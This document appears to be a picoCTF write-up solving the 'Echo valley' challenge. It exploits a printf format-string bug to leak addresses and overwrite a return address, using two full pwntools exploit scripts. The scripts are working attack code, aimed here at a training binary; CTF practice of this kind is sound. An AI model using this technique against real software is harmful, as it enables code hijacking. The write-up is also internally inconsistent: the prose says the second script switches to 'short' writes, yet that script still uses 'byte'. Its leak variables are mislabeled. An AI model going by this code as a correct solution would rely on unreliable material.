---
title: "Echo valley"
date: "2025-07-19"
tags: ["picoCTF", "format string", "PIE", "canary"]
---

In this exercise we get a binary and its C source code.

```c
./valley     
Welcome to the Echo Valley, Try Shouting: 
hola
You heard in the distance: hola
adios
You heard in the distance: adios
```

It looks like a loop that asks us for input. Let's look at the protections the binary has:

```c
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

Full house! It has everything: PIE, NX, Canary and Full RELRO. Let's take a look at the code:

```c
void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf); // Vulnerabilidad de Format String
        fflush(stdout);
    }
    fflush(stdout);
}
```

Looking at the `echo_valley` function we can see that we are indeed in a loop that asks for input until we type `exit`. If we look at how our input is printed on screen we can see the format is not specified, so there is a format string vulnerability.

Let's try throwing a lot of `%p` to see if there is anything interesting on the stack:

```c
./valley
Welcome to the Echo Valley, Try Shouting: 
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
You heard in the distance: 0x7ffc611845c0 (nil) (nil) (nil) (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025 0xc4d7f2c0ba99ee00 0x7ffc611847f0 0x55c3cf318413 0x1 0x7f471c81bca8 0x7ffc611848f0 0x55c3cf318401 0x1cf317040 0x7ffc61184908 0x7ffc61184908 0xde65293a6740c525 (nil) 0x7ffc61184918 0x7f471ca40000 0x55c3cf31ad78
```

We can see some addresses. Looking closely, a couple of them are interesting:

* Slot 20 of the stack: `0x7ffc611847f0` (looks like a stack address)
* Slot 21 of the stack: `0x55c3cf318413` (looks like a program address)

Besides that, we can try to see if our input is in there too:

```c
ABCDEF%p %p %p %p %p %p %p %p %p %p
You heard in the distance: ABCDEF0x7ffeb9742620 (nil) (nil) 0x560a17ab96d4 (nil) 0x7025464544434241
```

And it is indeed at position 6.

Let's dig a bit more into what is at the address of stack element 21

```c
You heard in the distance: 0x555555555413

   0x000055555555540e <+13>:      call   0x555555555307 <echo_valley>
   0x0000555555555413 <+18>:      mov    eax,0x0
   0x0000555555555418 <+23>:      pop    rbp
```

There it is! That address is the address right after a call, which means it is the address of the return address once we are inside the function being called.

Since we know the address of an instruction leaked on the stack we can calculate the offset of that instruction, and with the offset we can then get the binary address in pwntools:

```c
piebase
Calculated VA from /home/ub1cu0/Desktop/picoCTF/Echo_Valley/valley = 0x555555554000

Offset de la Dirección de Retorno: 0x555555555413 - 0x555555554000 = 0x1413
```

We will calculate the binary address later, when we write the script that solves the exercise.

The pwntools `mtstr_payload` function lets us change the value of a variable on the stack. To use it we need 2 things:

* The position of a controllable parameter on the stack (WE HAVE IT)
* The address of the variable to change (WE DO NOT HAVE IT YET)

We still have to find out the address where the return address is stored, the one whose value is the address at slot 21 of the stack.

Let's use the `telescope` command to take a look at the stack elements:

```c
You heard in the distance: 0x7fffffffdca0

pwndbg> telescope $rsp 30
00:0000│ rsp 0x7fffffffdc20 ◂— 0x40
01:0008│-068 0x7fffffffdc28 ◂— 0xa
02:0010│-060 0x7fffffffdc30 ◂— 0x8000
03:0018│-058 0x7fffffffdc38 ◂— 0
04:0020│-050 0x7fffffffdc40 ◂— 0xb700000006
05:0028│-048 0x7fffffffdc48 ◂— 0
... ↓        7 skipped
0d:0068│-008 0x7fffffffdc88 —▸ 0x7ffff7fe4780 (dl_main) ◂— push rbp
0e:0070│ rbp 0x7fffffffdc90 —▸ 0x7fffffffdca0 ◂— 1
0f:0078│+008 0x7fffffffdc98 —▸ 0x555555555413 (main+18) ◂— mov eax, 0
10:0080│+010 0x7fffffffdca0 ◂— 1 // Aquí
```

Look at this! The leaked stack address matches the address 16 bytes away from rbp. Between our leak address and the RBP address there is one address in the middle. Now comes the important part, what is that address?

When a C program calls a function the first thing that happens is a push of RIP and then a push of RBP. Knowing that, we can tell that the address between our leak and RBP is the `` dirección de retorno` `` or, put another way, the return address is:

```c
dirección de nuestro leak del stack - 8 bytes
```

Now that we know the address of the variable we want to overwrite we can prepare the script:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./valley")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b main
piebase
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote("shape-facility.picoctf.net", 49337)

    return r


def main():
    r = conn()

    offset_input = 6
    
    offset_piebase = 0x1413 # Calculo del offset
    info(f'Offset PIE base: {hex(offset_piebase)}')

    r.sendlineafter(b':', b'%20$p %21$p') # Conseguimos el leak de la posición 20 y 21 de la pila

    leaked_line = r.recvline_contains(b':').decode().strip()
    
    leaked_return_address = int(leaked_line.split()[-2], 16) - 0x8 # Calculo de la dirección de retorno
    info(f'Leaked Return Address: {hex(leaked_return_address)}')
    leaked_stack_address = int(leaked_line.split()[-1], 16)
    info(f'Leaked Return Address: {hex(leaked_return_address)}')
    info(f'Leaked Stack Address: {hex(leaked_stack_address)}')

    base_binario = leaked_stack_address - offset_piebase # Calculo de la base del binario, leak de la dirección menos el offset calculado
    info(f'Base del binario: {hex(base_binario)} ({hex(leaked_stack_address)} - {hex(offset_piebase)})')
    exe.address = base_binario # Indicamos a pwntools cual es la dirección del binario (esto sirve para poder usar la función symbols aunque haya PIE)
    valor = {leaked_return_address: exe.symbols.print_flag} # Diccionario que contiene DIRECCIÓN VARIABLE A MODIFICAR: NUEVO VALOR
    payload = fmtstr_payload(offset_input, valor, write_size='byte')
    r.sendline(payload)
    r.sendline('exit')  
    r.interactive()


if __name__ == "__main__":
    main()

```

When we run the script we see that even though it prints the data correctly with the `infos`, it does not give us the FLAG. Why does this happen?

If we look at the program code again we can see that the `buf` variable, where our input goes, has a maximum of 100 bytes:

```c
char buf[100];
```

Let's check how many bytes our payload takes by adding this line to the code:

```python
info(f'Longitud Payload: {len(payload)}')
```

```c
[*] Longitud Payload: 120
```

Here is the problem, our payload is too big and the last 20 bytes are dropped. What can we do to shrink our payload?

Looking closely, our `fmtstr_payload` function takes 3 parameters, and the last one controls the write size of the payload.

There are 3 write sizes for our function:

* Byte
* Short
* Int

In the order I put them, the higher up, the more space the payload takes but the more precision on the addresses. If we use `short` instead of `byte` the payload will be smaller but so will its precision. Since it is our only alternative, let's try it:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./valley")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote("shape-facility.picoctf.net", 56161)

    return r


def main():
    r = conn()

    offset_input = 6
    
    offset_piebase = 0x1413 # Calculo del offset
    info(f'Offset PIE base: {hex(offset_piebase)}')

    r.sendlineafter(b':', b'%20$p %21$p') # Conseguimos el leak de la posición 20 y 21 de la pila

    leaked_line = r.recvline_contains(b':').decode().strip()
    
    leaked_return_address = int(leaked_line.split()[-2], 16) - 0x8 # Calculo de la dirección de retorno
    info(f'Leaked Return Address: {hex(leaked_return_address)}')
    leaked_stack_address = int(leaked_line.split()[-1], 16)
    info(f'Leaked Return Address: {hex(leaked_return_address)}')
    info(f'Leaked Stack Address: {hex(leaked_stack_address)}')

    base_binario = leaked_stack_address - offset_piebase # Calculo de la base del binario, leak de la dirección menos el offset calculado
    info(f'Base del binario: {hex(base_binario)} ({hex(leaked_stack_address)} - {hex(offset_piebase)})')
    exe.address = base_binario # Indicamos a pwntools cual es la dirección del binario (esto sirve para poder usar la función symbols aunque haya PIE)
    valor = {leaked_return_address: exe.symbols.print_flag} # Diccionario que contiene DIRECCIÓN VARIABLE A MODIFICAR: NUEVO VALOR
    payload = fmtstr_payload(offset_input, valor, write_size='byte')
    r.sendline(payload)
    info(f'Longitud Payload: {len(payload)}')
    r.sendline('exit')  
    r.interactive()


if __name__ == "__main__":
    main()
```

> After sending the payload we have to send the word `exit` as text so the program leaves the loop and the function ends.

```c
Congrats! Here is your flag: picoctf{SECRETO}
```

We have the Flag!
